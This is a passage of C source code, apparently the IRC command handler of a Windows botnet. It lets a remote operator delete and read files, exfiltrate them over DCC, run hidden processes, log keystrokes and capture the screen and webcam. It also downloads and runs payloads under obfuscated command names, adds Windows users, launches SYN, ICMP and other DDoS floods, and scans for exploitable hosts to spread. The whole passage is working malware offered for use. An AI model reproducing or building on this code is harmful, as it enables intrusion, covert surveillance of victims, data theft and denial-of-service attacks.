				return 1;
			}
			#endif
			else if (strcmp("f823j8d", a[s]) == 0 || strcmp("su83", a[s]) == 0) { 
				if (DeleteFile(a[s+1])) 
					_snprintf(sendbuf,sizeof(sendbuf),"4<<12[FILE]: Deleted '%s'.4>>",a[s+1]);
				else 
					_snprintf(sendbuf,sizeof(sendbuf),PrintError("[FILE]:"));

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#ifndef NO_DCC
			else if (strcmp("get", a[s]) == 0 || strcmp("gt", a[s]) == 0) {
				DCC dcc;
				memset(dcc.host,0,sizeof(dcc.host));
				sprintf(dcc.filename,"%s",a[s+1]);

			    dcc.sock = sock;
				_snprintf(dcc.sendto,sizeof(dcc.sendto),user);
				dcc.notice = notice;
				dcc.silent = silent;

				sprintf(sendbuf,"4<<12[DCC]: Send File: %s, User: %s.4>>",dcc.filename,dcc.sendto);
				dcc.threadnum=addthread(sendbuf,DCC_THREAD,NULL);
				if (threads[dcc.threadnum].tHandle = CreateThread(NULL, 0, &DCCSendThread, (LPVOID)&dcc, 0, &id)) {
					while (dcc.gotinfo == FALSE) 
						Sleep(50);
				} else
					sprintf(sendbuf,"4<<12[DCC]: Failed to start transfer thread, error: <%d>.4>>", GetLastError());
				addlog(sendbuf);

				return 1;
			}
			#endif
			else if (strcmp("list", a[s]) == 0 || strcmp("li", a[s]) == 0) { 
				GetFiles(a[s+1],sock,a[2],NULL);
				addlogv("4<<12[FILE]: List: %s4>>", a[s+1]);

				return repeat;
			}
			#ifndef NO_VISIT
			else if (strcmp("visit", a[s]) == 0 || strcmp("v", a[s]) == 0) {
				VISIT visit;
				strncpy(visit.host, a[s+1], sizeof(visit.host)-1);
				if (a[s+2] != NULL) 
					strncpy(visit.referer, a[s+2], sizeof(visit.referer)-1);
				strncpy(visit.chan, a[2], sizeof(visit.chan)-1);
				visit.sock = sock;
				visit.silent = silent;
				visit.notice = notice;

				sprintf(sendbuf,"4<<12[VISIT]: URL: %s.4>>",a[s+1]);
				visit.threadnum=addthread(sendbuf,VISIT_THREAD,NULL);
				if (threads[visit.threadnum].tHandle = CreateThread(NULL, 0, &VisitThread, (LPVOID)&visit, 0, &id)) {
					while(visit.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"4<<12[VISIT]: Failed to start connection thread, error: <%d>.4>>", GetLastError());
				addlog(sendbuf);

				return repeat;
			}
			#endif
			else if (strcmp("mirccmd", a[s]) == 0 || strcmp("mirc", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]); 
					if (y != NULL) {
						if (!mirccmd(y))
							sprintf(sendbuf,"4<<12[mIRC]: Client not open.4>>");
						else
							sprintf(sendbuf,"4<<12[mIRC]: Command sent.4>>");
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);
					}
                }

				return repeat;
			}
			#ifndef NO_REMOTECMD
			else if (strcmp("cmd", a[s]) == 0 || strcmp("cm", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]); 
					if (y != NULL) { 
						strcat(y,"\n");
						if (!send_commands(y)) {
							sprintf(sendbuf,"4<<12[CMD]: Error sending to remote shell.4>>");
							if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
						}
						else
							sprintf(sendbuf,"4<<12[CMD]: Commands: %s4>>",y);
						addlog(sendbuf);
					}
				}
				
				return repeat;
			}
			#endif
			else if (strcmp("readfile", a[s]) == 0 || strcmp("rf", a[s]) == 0) {
				FILE *fp;
				if ((fp = fopen(a[s+1],"r")) != NULL) {
					while (fgets(sendbuf,sizeof(sendbuf),fp) != NULL)
						irc_privmsg(sock, a[2], sendbuf, notice, TRUE);
					fclose(fp);
					sprintf(sendbuf,"4<<12[MAIN]: Read file complete: %s4>>",a[s+1]);
				} else {
					sprintf(sendbuf,"4<<12[MAIN]: Read file failed: %s4>>",a[s+1]);
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
				}
				addlog(sendbuf);

				return repeat;
			}
			#ifndef NO_IDENT
			else if (strcmp("ident", a[s]) == 0) {
				if (strcmp("on", a[s+1]) == 0) {
					if (findthreadid(IDENT_THREAD) > 0)
						sprintf(sendbuf ,"4<<12[IDENT]: Already running.4>>");
					else {
						sprintf(sendbuf,"4<<12[IDENTD]: Server running on Port: 113.4>>");
						i = addthread(sendbuf,IDENT_THREAD,NULL);
						if ((threads[i].tHandle = CreateThread(NULL, 0, &IdentThread, (LPVOID)i, 0, &id)) == NULL)
							sprintf(sendbuf,"4<<12[IDENTD]: Failed to start server, error: <%d>.4>>", GetLastError());
					}
				}
				else if (strcmp("off", a[s+1]) == 0) {
					if ((i=killthreadid(IDENT_THREAD)) > 0)
						sprintf(sendbuf,"4<<12[IDENT]: Server stopped. (%d thread(s) stopped.)4>>",i);
					else
						sprintf(sendbuf,"4<<12[IDENT]: No thread found.4>>");
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_KEYLOG
			else if (strcmp("keylog", a[s]) == 0) {
				if (strcmp("on", a[s+1]) == 0 || strcmp("file", a[s+1]) == 0) {
					if (findthreadid(KEYLOG_THREAD) > 0)
						sprintf(sendbuf ,"4<<12[KEYLOG]: Already running.4>>");
					else {
						KEYLOG keylog;
						keylog.sock = sock;
						keylog.notice = notice;
						keylog.silent = ((strcmp("file", a[s+1]) == 0)?(TRUE):(silent));
						_snprintf(keylog.chan, sizeof(keylog.chan), ((a[s+2])?(a[s+2]):((strcmp(keylogchan,"")==0)?(a[2]):(keylogchan))));

						sprintf(sendbuf, "4<<12[KEYLOG]: Key logger active.4>>");
						keylog.threadnum = addthread(sendbuf, KEYLOG_THREAD, NULL);
						if (threads[keylog.threadnum].tHandle = CreateThread(NULL, 0, &KeyLoggerThread, (LPVOID)&keylog, 0, &id)) {
							while(keylog.gotinfo == FALSE)
								Sleep(50);
						} else
							sprintf(sendbuf,"4<<12[KEYLOG]: Failed to start logging thread, error: <%d>.4>>", GetLastError());
					}
				}
				else if (strcmp("off", a[s+1]) == 0) {
					if ((i=killthreadid(KEYLOG_THREAD)) > 0)
						sprintf(sendbuf,"4<<12[KEYLOG]: Key logger stopped. (%d thread(s) stopped.)4>>",i);
					else
						sprintf(sendbuf,"4<<12[KEYLOG]: No key logger thread found.4>>");
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_NET
						else if (strcmp("net", a[s]) == 0) {
							if((!noadvapi32) || (!nonetapi32)) {
								if (x != NULL) {
									char *y = NULL;
									if (a[s+2]) // get the full service name if exists
										y = strstr(x, a[s+2]);
									if (strcmp("start", a[s+1]) == 0)
										if (a[s+2])
											sprintf(sendbuf, "%s", Services(NET_START, y));
										else {
											if (ListServices(sock, a[2], notice))
												sprintf(sendbuf, "4<<12[NET]: Service list completed.4>>");
								else
									sprintf(sendbuf, "4<<12[NET]: Service list failed.4>>");
										}
									else if (strcmp("stop", a[s+1]) == 0)
										sprintf(sendbuf, "%s", Services(NET_STOP, y));
									else if (strcmp("pause", a[s+1]) == 0)
										sprintf(sendbuf, "%s", Services(NET_PAUSE, y));
									else if (strcmp("continue", a[s+1]) == 0)
										sprintf(sendbuf, "%s", Services(NET_CONTINUE, y));
									else if (strcmp("delete", a[s+1]) == 0)
										sprintf(sendbuf, "%s", Services(NET_DELETE, y));
									else if (strcmp("share", a[s+1]) == 0) {
										if (a[s+2]) {
											if (parameters['d'])
												sprintf(sendbuf, "%s", Shares(NET_DELETE, a[s+2]));
											else
												sprintf(sendbuf, "%s", Shares(NET_ADD, a[s+2], a[s+3]));
										} else {
											if (ListShares(sock, a[2], notice))
												sprintf(sendbuf, "4<<12[NET]: Share list completed.4>>");
								else
									sprintf(sendbuf, "4<<12[NET]: Share list failed.4>>");
										}
									}
									else if (strcmp("user", a[s+1]) == 0) {
										if (a[s+2]) {
											if (parameters['d'])
												sprintf(sendbuf, "%s", Users(NET_DELETE, a[s+2], NULL, sock, a[2], notice));
											else {
												if (a[s+3])
													sprintf(sendbuf, "%s", Users(NET_ADD, a[s+2], a[s+3], sock, a[2], notice));
												else
													sprintf(sendbuf, "%s", Users(NET_INFO, a[s+2], NULL, sock, a[2], notice));
											}
										} else {
											if (ListUsers(sock, a[2], notice))
												sprintf(sendbuf, "4<<12[NET]: User list completed.4>>");
											else
												sprintf(sendbuf, "4<<12[NET]: User list failed.4>>");
										}
									}
									else if (strcmp("send", a[s+1]) == 0) {
							if (a[s+2])
								sprintf(sendbuf, "%s", NetSend(y, sock, a[2], notice));
							else
								sprintf(sendbuf, "4<<12[NET]: No message specified.4>>");
						}
						else
							sprintf(sendbuf,"4<<12[NET]: Command unknown.4>>");
					}
				} else
					sprintf(sendbuf, "4<<12[NET]: Failed to load advapi32.dll or netapi32.dll.4>>");
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);
			
				return repeat;
			}
			#endif
			#ifndef NO_CAPTURE
			else if (strcmp("capture", a[s]) == 0 || strcmp("cap", a[s]) == 0) {
				if (strcmp(a[s+1],"screen") == 0) {
					if (a[s+2]) {
						if (Capture(a[s+2]) == TRUE)
							sprintf(sendbuf,"4<<12[CAPTURE]: Screen capture saved to: %s.4>>", a[s+2]);
						else
							sprintf(sendbuf,"4<<12[CAPTURE]: Error while capturing screen.4>>");
					} else
						sprintf(sendbuf,"4<<12[CAPTURE]: No filename specified for screen capture.4>>");
				}
				if (strcmp(a[s+1],"drivers") == 0) {
					char buffer[1024],svName[256], svComment[IRCLINE];

					for (i=0; i < 10; i++) {
						if(fcapGetDriverDescription(i, svName, 255, svComment, (IRCLINE-1))) {
							sprintf(buffer, "4<<12[CAPTURE]: Driver #%d - %s - %s.4>>", i, svName, svComment);
							irc_privmsg(sock,a[2],buffer,notice);
						}
					}
					sprintf(sendbuf,"4<<12[CAPTURE]: Driver list complete.4>>");
				}
				if (strcmp(a[s+1],"frame") == 0) {
					if (a[s+2] && a[s+3] && a[s+4] && a[s+5]) {
						if (CaptureFrame(a[s+2], atoi(a[s+3]), atoi(a[s+4]), atoi(a[s+5])) == 0)
							sprintf(sendbuf,"4<<12[CAPTURE]: Webcam capture saved to: %s.4>>", a[s+2]);
						else
							sprintf(sendbuf,"4<<12[CAPTURE]: Error while capturing from webcam.4>>");
					} else
						sprintf(sendbuf,"4<<12[CAPTURE]: Invalid parameters for webcam capture.4>>");
				}
				if (strcmp(a[s+1],"video") == 0) {
					if (a[s+2] && a[s+3] && a[s+4] && a[s+5] && a[s+6]) {
						if (CaptureVideo(a[s+2], atoi(a[s+3]), atoi(a[s+4]), atoi(a[s+5]), atoi(a[s+6])) == 0)
							sprintf(sendbuf,"4<<12[CAPTURE]: Amateur video saved to: %s.4>>", a[s+2]);
						else
							sprintf(sendbuf,"4<<12[CAPTURE]: Error while capturing amateur video from webcam.4>>");

					} else
						sprintf(sendbuf,"4<<12[CAPTURE]: Invalid parameters for amateur video capture.4>>");
				}
				if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
				addlog(sendbuf);

				return repeat;
			}
			#endif
			else if (strcmp("gethost", a[s]) == 0 || strcmp("gh", a[s]) == 0) {
				if(strstr(host, a[s+1])) {
					if (a[s+2]) {
						char *y = strstr(x, a[s+2]);
						if (y != NULL) {
							sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], y);
							strncpy(line,  sendbuf, (IRCLINE-1));
							sprintf(sendbuf,"4<<12[MAIN]: Gethost: %s, Command: %s4>>", a[s+1],y);
							repeat++;
						} else
							sprintf(sendbuf,"4<<12[MAIN]: Unable to extract Gethost command.4>>");
					} else {
						irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
						_snprintf(sendbuf,sizeof(sendbuf),"4<<12[MAIN]: Gethost: %s.4>>",a[s+1]);
					}
					addlog(sendbuf);
				}

				return repeat;
			}
			// commands requiring at least 2 parameters
			else if (a[s+2] == NULL) return 1;
			else if (strcmp("addalias", a[s]) == 0 || strcmp("aa", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						addalias(a[s+1], y);
						sprintf(sendbuf,"4<<12[MAIN]: Alias added: %s.4>>", a[s+1]);
						if(!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);
					}
				}

				return 1;
			}
			else if (strcmp("privmsg", a[s]) == 0 || strcmp("pm", a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						irc_privmsg(sock, a[s+1], y, FALSE);
						addlogv("4<<12[MAIN]: Privmsg: %s: %s.4>>",a[s+1], y);
					}
				}

				return repeat;
			}
			else if (strcmp("action", a[s]) == 0 || strcmp("a", a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						sprintf(sendbuf, "\1ACTION %s\1", y);
						irc_privmsg(sock, a[s+1], sendbuf, FALSE);
						addlogv("4<<12[MAIN]: Action: %s: %s.4>>",a[s+1], y);
					}
				}

				return repeat;
			}
			else if (strcmp("cycle", a[s]) == 0 || strcmp("cy", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) 
					return 1;
				irc_sendv(sock, "PART %s\r\n", a[s+2]);
				Sleep(atoi(a[s+1])*1000);
				irc_sendv(sock, "JOIN %s %s\r\n", a[s+2], a[s+3]);
				addlog("4<<12[MAIN]: Cycle.4>>");

				return repeat;
			}
			else if (strcmp("mode", a[s]) == 0 || strcmp("m", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) {
						irc_sendv(sock, "MODE %s\r\n", y);
						addlogv("4<<12[MAIN]: Mode change: %s4>>",y);
					}
				}

				return repeat;
			}
			else if (strcmp("repeat", a[s]) == 0 || strcmp("rp", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					if (strcmp(a[s+2]+1,"repeat") != 0) {
						sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
						strncpy(line,  sendbuf, (IRCLINE-1));
						sprintf(sendbuf,"4<<12[MAIN]: Repeat: %s4>>", r);
						addlog(sendbuf);

						if (atoi(a[s+1]) > 0) 
							return repeat + atoi(a[s+1]); 
						else 
							return repeat;
					} else {
						sprintf(sendbuf,"4<<12[MAIN]: Repeat not allowed in command line: %s4>>", r);
						if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
						addlog(sendbuf);
					}
				}

				return repeat;
			}
			else if (strcmp("delay", a[s]) == 0 || strcmp("de", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) 
						Sleep(atoi(a[s+1])*1000);
					addlog("4<<12[MAIN]: Delay.4>>");
					return repeat + 1;
				}

				return 1;
			}
			#ifndef NO_DOWNLOAD
			else if ((strcmp("asfdsd", a[s]) == 0) || (strcmp("asdfasvewvas", a[s]) == 0)) {
				if (strcmp(botid, a[s+2]) != 0) {
					char tempdir[MAX_PATH], tmpbuf[MAXNICKLEN];
					GetTempPath(sizeof(tempdir), tempdir);

					DOWNLOAD dl;
					strncpy(dl.url,  a[s+1], sizeof(dl.url)-1);
					sprintf(dl.dest, "%s%s.exe", tempdir, rndnickletter(tmpbuf));
					dl.update = 1;
					dl.run = 0;
					dl.expectedcrc=((a[s+3])?(strtoul(a[s+3],0,16)):(0));
					dl.filelen=((a[s+4])?(atoi(a[s+4])):(0));
					dl.encrypted=(parameters['e']);

					dl.sock = sock;
					strncpy(dl.chan,  a[2], sizeof(dl.chan)-1);
					dl.notice=notice;
					dl.silent = silent;

					sprintf(sendbuf, "4<<12[UPDATE]: Downloading update from: %s.4>>", a[s+1]);
					dl.threadnum = addthread(sendbuf, UPDATE_THREAD, sock);
					if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id)) {
						while(dl.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"4<<12[UPDATE]: Failed to start download thread, error: <%d>.4>>", GetLastError());
				} else
					sprintf(sendbuf,"4<<12[UPDATE]: Bot ID must be different than current running process.4>>");

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#endif
			else if (strcmp("fsj;dlkjf", a[s]) == 0 || strcmp("djkfjd", a[s]) == 0) {
				PROCESS_INFORMATION pinfo;
				STARTUPINFO sinfo;
				memset(&sinfo, 0, sizeof(STARTUPINFO));
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = STARTF_USESHOWWINDOW;
				sinfo.wShowWindow=SW_HIDE;
				if (atoi(a[s+1]) == 1) sinfo.wShowWindow=SW_SHOW;
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL)
						if (!CreateProcess(NULL, y, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo))
							sprintf(sendbuf,"4<<12[EXEC]: Couldn't execute file.4>>");
						else
							sprintf(sendbuf,"4<<12[EXEC]: Commands: %s4>>",y);
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#ifndef NO_FINDFILE
			else if (strcmp("findfile", a[s]) == 0 || strcmp("ff", a[s]) == 0) {
				FFIND ffind;
				_snprintf(ffind.filename,sizeof(ffind.filename),a[s+1]);
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL)
						sprintf(ffind.dirname,y);
				}
				_snprintf(ffind.chan,sizeof(ffind.chan),a[2]);
				ffind.sock = sock;
				ffind.notice = notice;
				ffind.silent = silent;

				_snprintf(sendbuf, sizeof(sendbuf),"4<<12[FINDFILE]: Searching for file: %s in: %s.4>>", ffind.filename, ffind.dirname);
				ffind.threadnum = addthread(sendbuf, FIND_THREAD, NULL);
				if (threads[ffind.threadnum].tHandle = CreateThread(NULL, 0, &FindFileThread, (LPVOID)&ffind, 0, &id)) {
					while (ffind.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"4<<12[FINDFILE]: Failed to start search thread, error: <%d>.4>>", GetLastError());
				addlog(sendbuf);

				return 1;
			}
			#endif
			else if (strcmp("rename", a[s]) == 0 || strcmp("rnm", a[s]) == 0) {
				if (MoveFile(a[s+1],a[s+2]))
					_snprintf(sendbuf,sizeof(sendbuf),"4<<12[FILE]: Rename: '%s' to: '%s'.4>>", a[s+1], a[s+2]);
				else
					_snprintf(sendbuf,sizeof(sendbuf),PrintError("[FILE]:"));

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#ifndef NO_ICMP
			else if (strcmp("icmpflood", a[s]) == 0 || strcmp("icmp", a[s]) == 0) {
				ICMPFLOOD icmpflood;
				if ((icmpflood.time = atoi(a[s+2])) > 0) {
					_snprintf(icmpflood.ip,sizeof(icmpflood.ip),a[s+1]);
					icmpflood.spoof = ((parameters['r'])?(TRUE):(FALSE));
					icmpflood.sock = sock;
					_snprintf(icmpflood.chan,sizeof(icmpflood.chan),a[2]);
					icmpflood.notice = notice;
					icmpflood.silent = silent;

					_snprintf(sendbuf,sizeof(sendbuf),"4<<12[ICMP]: Flooding: (%s) for %s seconds.4>>", a[s+1], a[s+2]);
					icmpflood.threadnum = addthread(sendbuf,ICMP_THREAD,NULL);
					if (threads[icmpflood.threadnum].tHandle = CreateThread(NULL, 0, &ICMPFloodThread, (LPVOID)&icmpflood, 0, &id)) {
						while(icmpflood.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"4<<12[ICMP]: Failed to start flood thread, error: <%d>.4>>", GetLastError());
				} else
					sprintf(sendbuf,"4<<12[ICMP]: Invalid flood time must be greater than 0.4>>");

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif

			// commands requiring at least 3 parameters
			else if (a[s+3] == NULL) return 1;
			#ifndef NO_DDOS
			else if (strcmp("ddos.syn", a[s]) == 0 || strcmp("ddos.ack", a[s]) == 0 || strcmp("ddos.random", a[s]) == 0) {
				DDOS ddos;
				strncpy(ddos.ip, a[s+1], sizeof(ddos.ip)-1);
				strncpy(ddos.port, a[s+2], sizeof(ddos.port)-1);
				strncpy(ddos.length, a[s+3], sizeof(ddos.length)-1);
				strncpy(ddos.chan, a[2], sizeof(ddos.chan)-1);
				strncpy(ddos.type,a[s],32);
				ddos.notice = notice;
				ddos.silent = silent;
				ddos.sock = sock;

				sprintf(sendbuf, "4<<12[DDoS]: Flooding: (%s:%s) for %s seconds.4>>", a[s+1], a[s+2], a[s+3]);
				ddos.threadnum = addthread(sendbuf,DDOS_THREAD,NULL);
				if (threads[ddos.threadnum].tHandle = CreateThread(NULL, 0, &DDOSThread, (LPVOID)&ddos, 0, &id)) {
					while(ddos.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"4<<12[DDoS]: Failed to start flood thread, error: <%d>.4>>", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_SYN
			else if (strcmp("synflood", a[s]) == 0 || strcmp("syn", a[s]) == 0) {
				SYNFLOOD synflood;
				strncpy(synflood.ip, a[s+1], sizeof(synflood.ip)-1);
				strncpy(synflood.port, a[s+2], sizeof(synflood.port)-1);
				strncpy(synflood.length, a[s+3], sizeof(synflood.length)-1);
				strncpy(synflood.chan, a[2], sizeof(synflood.chan)-1);
				synflood.notice = notice;
				synflood.silent = silent;
				synflood.sock = sock;

				sprintf(sendbuf, "4<<12[SYN]: Flooding: (%s:%s) for %s seconds.4>>", a[s+1], a[s+2], a[s+3]);
				synflood.threadnum = addthread(sendbuf,SYN_THREAD,NULL);
				if (threads[synflood.threadnum].tHandle = CreateThread(NULL, 0, &SynFloodThread, (LPVOID)&synflood, 0, &id)) {
					while(synflood.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"4<<12[SYN]: Failed to start flood thread, error: <%d>.4>>", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_DOWNLOAD
			else if (strcmp("djlssdfskjf", a[s]) == 0 || strcmp("asfdavvfdssd", a[s]) == 0) {
				DOWNLOAD dl;
				strncpy(dl.url, a[s+1], sizeof(dl.url)-1);
				strncpy(dl.dest, a[s+2], sizeof(dl.dest)-1);
				dl.update = 0;
				dl.run = ((a[s+3])?(atoi(a[s+3])):(0));
				dl.expectedcrc=((a[s+4])?(strtoul(a[s+4],0,16)):(0));
				dl.filelen=((a[s+5])?(atoi(a[s+5])):(0));
				dl.encrypted=(parameters['e']);

				dl.sock = sock;
				strncpy(dl.chan,  a[2], sizeof(dl.chan)-1);
				dl.notice=notice;
				dl.silent = silent;

				sprintf(sendbuf, "4<<12[DOWNLOAD]: Downloading URL: %s to: %s.4>>", a[s+1], a[s+2]);
				dl.threadnum = addthread(sendbuf, DOWNLOAD_THREAD, sock);
				if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id)) {
					while(dl.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"4<<12[DOWNLOAD]: Failed to start transfer thread, error: <%d>.4>>", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_REDIRECT
			else if (strcmp("redsfsdct", a[s]) == 0 || strcmp("rsdfszd", a[s]) == 0) {
				REDIRECT redirect;
				redirect.lport = atoi(a[s+1]);
				strncpy(redirect.dest,  a[s+2], sizeof(redirect.dest)-1);
				redirect.port = atoi(a[s+3]);
				redirect.sock = sock;
				_snprintf(redirect.chan,sizeof(redirect.chan),a[2]);
				redirect.notice = notice;
				redirect.silent = silent;

				sprintf(sendbuf, "4<<12[REDIRECT]: TCP redirect created from: %s:%d to: %s:%d.4>>", GetIP(sock), redirect.lport, redirect.dest, redirect.port);
				redirect.threadnum = addthread(sendbuf,REDIRECT_THREAD,NULL);
				if (threads[redirect.threadnum].tHandle = CreateThread(NULL, 0, &RedirectThread, (LPVOID)&redirect, 0, &id)) {
					while(redirect.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"4<<12[REDIRECT]: Failed to start redirection thread, error: <%d>.4>>", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_SCAN
			else if (strcmp("scan", a[s]) == 0 || strcmp("sc", a[s]) == 0) {
				SCAN scan;
				scan.addy.S_un.S_addr = finet_addr(a[s+1]);
				scan.port = atoi(a[s+2]);
				scan.delay = atoi(a[s+3]);
				scan.sock = sock;
				strncpy(scan.chan,  a[2], sizeof(scan.chan)-1);
				scan.notice = notice;
				scan.silent = silent;

				sprintf(sendbuf, "4<<12[SCAN]: Port scan started: %s:%d with delay: %d(ms).4>>", finet_ntoa(scan.addy), scan.port, scan.delay);
				scan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
				if (threads[scan.threadnum].tHandle = CreateThread(NULL, 0, &ScanThread, (LPVOID)&scan, 0, &id)) {
					while(scan.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"4<<12[SCAN]: Failed to start scan thread, error: <%d>.4>>", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif

			// commands requiring at least 4 parameters
			else if (a[s+4] == NULL) return 1;
			#ifndef NO_ADVSCAN
			else if (strcmp("advscan", a[s]) == 0 || strcmp("adv", a[s]) == 0) {
				int scanthreads=findthreadid(SCAN_THREAD);
				if (scanthreads + atoi(a[s+2]) > MAXSCANTHRD) {
					sprintf(sendbuf ,"4<<12[SCAN]: Already %d scanning threads. Too many specified.4>>", scanthreads);
					irc_privmsg(sock,a[2],sendbuf,notice);
				} else {
					ADVSCAN advscan;
					advscan.port = atoi(a[s+1]); // check for method or port number
					advscan.threads = atoi(a[s+2]);
					advscan.delay = atoi(a[s+3]);
					advscan.delay = ((advscan.delay < 5)?(5):(advscan.delay));
					advscan.delay = ((advscan.delay > 60)?(60):(advscan.delay));
					advscan.minutes = atoi(a[s+4]);
					advscan.minutes = ((advscan.minutes > MAXSCANTIME)?(MAXSCANTIME):(advscan.minutes));
					advscan.exploit = -1;

					for(i=0;exploit[i].port != 0;i++) {
						if (strcmp(exploit[i].command, a[s+1]) == 0) {
							advscan.port = exploit[i].port;
							advscan.exploit = i;

							break;
						}
					}

					if (advscan.port == 0) {
						sprintf(sendbuf, "4<<12[SCAN]: Failed to start scan, port is invalid.4>>");
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);

						return 1;
					}

					if (a[s+5] && a[s+5][0] != '#') {
						_snprintf(advscan.ip,sizeof(advscan.ip),a[s+5]);
						advscan.random = ((strchr(a[s+5],'x'))?(TRUE):(FALSE));
					} else {
						if (parameters['a'] || parameters['b'] || parameters['r']) {
							SOCKADDR_IN ssin;
							int ssin_len=sizeof(ssin);
							fgetsockname(sock,(LPSOCKADDR)&ssin,&ssin_len);
							ssin.sin_addr.S_un.S_addr&=(parameters['a']) ? 0xFF : 0xFFFF;
							strncpy(advscan.ip,finet_ntoa(ssin.sin_addr), sizeof(advscan.ip));

							if (parameters['r']) {
								int extractip = ((parameters['a']) ? 3 : 2);
								for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);

								advscan.random = TRUE;
							} else
								advscan.random = FALSE;
						} else {
							sprintf(sendbuf, "4<<12[SCAN]: Failed to start scan, no IP specified.4>>");
							if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
							addlog(sendbuf);

							return 1;
						}
					}

					advscan.sock = sock;
					advscan.notice = notice;
					advscan.silent = silent;
					_snprintf(advscan.chan,sizeof(advscan.chan),a[2]);
					if (a[s+6])
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+6]);
					else if (a[s+5] && a[s+5][0] == '#')
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+5]);
					else if (strcmp(exploitchan,"") != 0)
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),exploitchan);
					else
						advscan.msgchan[0] = '\0';

					sprintf(sendbuf, "4<<12[SCAN]: %s Port Scan started on %s:%d with a delay of %d seconds for %d minutes using %d threads.4>>",
						((advscan.random)?("Random"):("Sequential")), advscan.ip, advscan.port, advscan.delay, advscan.minutes, advscan.threads);
					advscan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
					if (threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (LPVOID)&advscan, 0, &id)) {
						while(advscan.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"4<<12[SCAN]: Failed to start scan thread, error: <%d>.4>>", GetLastError());

					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);

					return 1;
				}
			}
			#endif

			#ifndef NO_UDP
